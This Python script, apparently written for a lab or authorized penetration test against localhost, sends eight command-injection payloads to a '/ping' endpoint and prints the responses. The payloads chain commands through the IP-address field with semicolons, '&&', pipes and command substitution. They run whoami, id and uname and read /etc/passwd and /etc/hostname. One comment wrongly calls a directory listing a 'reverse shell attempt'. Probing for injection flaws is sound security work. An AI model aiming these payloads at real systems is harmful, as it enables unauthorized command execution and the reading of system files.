import requests
import urllib.parse
import json
import re

base_url = "http://localhost"
endpoint = "/ping"

print("="*80)
print("COMMAND INJECTION TESTING - /ping endpoint")
print("="*80)

# Test 1: Basic valid input
print("\n[TEST 1] Basic valid ping request")
test_payload = "127.0.0.1"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 2: Command injection with semicolon
print("\n[TEST 2] Command injection - semicolon")
test_payload = "127.0.0.1; whoami"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 3: Command injection with &&
print("\n[TEST 3] Command injection - logical AND")
test_payload = "127.0.0.1 && id"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 4: Command injection with pipe
print("\n[TEST 4] Command injection - pipe")
test_payload = "127.0.0.1 | cat /etc/passwd"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 5: Command substitution
print("\n[TEST 5] Command injection - command substitution")
test_payload = "127.0.0.1 $(whoami)"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 6: Backtick command substitution
print("\n[TEST 6] Command injection - backtick substitution")
test_payload = "127.0.0.1 `uname -a`"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 7: File read attempt
print("\n[TEST 7] Command injection - file read")
test_payload = "127.0.0.1; cat /etc/hostname"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

# Test 8: Reverse shell attempt (non-destructive check)
print("\n[TEST 8] Command injection - complex command")
test_payload = "127.0.0.1; ls -la /"
response = requests.post(
    f"{base_url}{endpoint}",
    data={"ip_address": test_payload},
    timeout=10
)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
print(f"Length: {len(response.text)} bytes")

